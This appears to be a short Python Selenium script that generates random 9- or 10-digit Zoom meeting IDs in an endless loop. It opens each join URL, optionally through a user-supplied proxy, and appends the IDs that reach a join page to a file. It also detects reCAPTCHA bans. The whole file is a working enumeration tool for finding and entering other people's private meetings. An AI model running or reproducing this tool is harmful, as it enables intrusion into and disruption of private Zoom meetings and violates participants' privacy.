##Importing
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException  
import time
import random

#Varibles
istrue = 'true'
works = 'false'

#Ask user for proxy, if any.
print('Input a proxy, press enter for none.')
print('eg: 1.1.1.1:1111')
PROXY = input()
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--proxy-server=%s' % PROXY)

browser = webdriver.Chrome(options=chrome_options) #Add the proxy to chrome

time.sleep(.5)
while istrue == 'true': #Infinite while loop
    rand=random.uniform(0, 1) #Generate random number to determine if it should be a 10 char code or a 9 char code
    if rand > 0.5: #If it's above 0.5, make it a 9 char code
        id=random.randrange(100000000, 999999999, 6)
    else: #else, make it a 10 char code
        id=random.randrange(1000000000, 9999999999, 6)
    joinid='https://zoom.us/wc/join/' + str(id) #put the code into the url
    print("trying code " + str(id))
    browser.get((joinid)) #Open the webbrowser / refresh
    if len(browser.find_elements_by_id('inputname')) > 0: #Check if it can find the name input (means that the code works
        print('Code ' + str(id) + ' works!')
        f = open("works.txt", "a") ##
        f.write(str(id)+"\n")      ## Write the working code to the text file
        f.close()                  ##
    elif len(browser.find_elements_by_id('wc_agree1')) > 0: #another check
        print('Code ' + str(id) + ' works!')
        f = open("works.txt", "a")
        f.write(str(id)+"\n")
        f.close()
    elif len(browser.find_elements_by_id('recaptcha-anchor-label')) > 0: #Try to find the google recaptcha
        print('You might have been banned.!')
    time.sleep(0.5) #Wait 0.5 seconds before trying again